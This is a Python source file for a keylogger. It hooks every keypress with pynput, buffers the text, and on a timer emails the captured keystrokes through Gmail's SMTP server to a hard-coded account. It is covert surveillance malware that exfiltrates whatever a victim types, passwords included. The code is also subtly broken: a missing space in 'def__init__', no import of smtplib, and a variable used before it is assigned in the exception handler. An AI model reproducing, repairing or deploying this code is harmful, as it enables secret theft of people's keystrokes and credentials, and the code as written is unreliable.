import threading
import pynput.keyboard as spy


store = ""          #global variable


class Keylogger:    #blueprint
    def__init__(self , time_interval , email , password):
        self.store = "Keylogger started"
        self.interval = time_interval
        self.email = email
        self.password = password
    
    def append_to_store(self , string):
        self.store = self.store + string


    def process_on_key_press(self , key):
       	# global store
        try:
            current_key = str(key.char)
            print(key)
        except:
            if current_key == key.space:
                current_key = " " 
            else:
                current_key = current_key + " " + str(key) + " "
        self.append_to_store(current_key)

    def send_mail(self , email, password, message):
    
        server = smtplib.SMTP("smtp.gmail.com", 587)    #google server

        server.starttls()

        server.login(email, password)

        server.sendmail(email, email, message)
        server.quit()


    def report(self):
        self.send_mail(self.email , self.password , "\n\n" + self.store)
        self.store = ""
        timer = threading.Timer(self.interval , self.report)    #waiting for sixty second to store the logging
        timer.start()
    def start(self):
        keyboard_listener = spy.Listener(on_press = self.process_on_key_press)
        with keyboard_listener:
            self.report()
            keyboard_listener.join()







#killall python to kill all the program